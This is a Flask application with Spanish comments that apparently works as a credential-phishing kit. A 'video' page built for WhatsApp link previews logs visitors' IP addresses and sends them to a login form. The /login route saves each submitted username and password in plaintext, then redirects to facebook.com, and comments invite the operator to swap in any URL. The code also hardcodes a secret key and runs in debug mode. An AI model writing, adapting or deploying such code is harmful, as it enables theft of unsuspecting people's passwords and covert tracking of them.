from flask import Flask, render_template, request, redirect, url_for, session
from flask_mysqldb import MySQL
import os

app = Flask(__name__)
app.secret_key = 'mi_clave_super_secreta_123'

# CONFIGURACIÓN DE MYSQL (Render)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST')
app.config['MYSQL_PORT'] = int(os.environ.get('MYSQL_PORT'))
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB')
mysql = MySQL(app)

# -----------------------------
# RUTAS PRINCIPALES
# -----------------------------

@app.route('/')
def inicio():
    return render_template('login.html')


@app.route('/login', methods=['POST'])
def login():
    usuario = request.form['usuario']
    contrasena = request.form['contrasena']

    # Registrar acceso normal
    cur = mysql.connection.cursor()
    cur.execute("INSERT INTO accesos (usuario, contrasena) VALUES (%s, %s)", (usuario, contrasena))
    mysql.connection.commit()
    cur.close()

    session['usuario'] = usuario

    # ⭐ REDIRIGIR A UNA PÁGINA EXTERNA DESPUÉS DE INICIAR SESIÓN
    return redirect("https://www.facebook.com/")   # ← CAMBIA ESTA URL POR LA QUE QUIERAS


@app.route('/registro')
def registro():
    return render_template('register.html')


@app.route('/registrar', methods=['POST'])
def registrar():
    usuario = request.form['usuario']
    contrasena = request.form['contrasena']

    cur = mysql.connection.cursor()
    try:
        cur.execute("INSERT INTO usuarios (usuario, contrasena) VALUES (%s, %s)", (usuario, contrasena))
        mysql.connection.commit()
        cur.close()
        return redirect(url_for('inicio'))
    except:
        cur.close()
        return "<h2>Ese usuario ya existe</h2>"


@app.route('/menu')
def menu():
    if 'usuario' not in session:
        return redirect('/')

    # ⭐ SI QUIERES QUE /menu TAMBIÉN REDIRIJA A UNA PÁGINA EXTERNA:
    return redirect("https://www.facebook.com/")   # ← CAMBIA ESTA URL SI QUIERES


# -----------------------------
# SISTEMA DE VIDEO CON VISTA PREVIA
# -----------------------------

# 1. Página que WhatsApp lee (solo metadatos)
@app.route('/video')
def video():
    return render_template('video.html')


# 2. Registra acceso y manda SIEMPRE al login
@app.route('/redirigir_video')
def redirigir_video():
    ip = request.remote_addr

    cur = mysql.connection.cursor()
    cur.execute("INSERT INTO accesos (usuario, contrasena) VALUES (%s, %s)", ("VISITA_VIDEO", ip))
    mysql.connection.commit()
    cur.close()

    return redirect('/')


# 3. Video real (solo usuarios logueados)
@app.route('/ver_video')
def ver_video():
    if 'usuario' not in session:
        return redirect('/')
    return render_template('ver_video.html')


# -----------------------------
# EJECUCIÓN
# -----------------------------
if __name__ == '__main__':
    app.run(debug=True)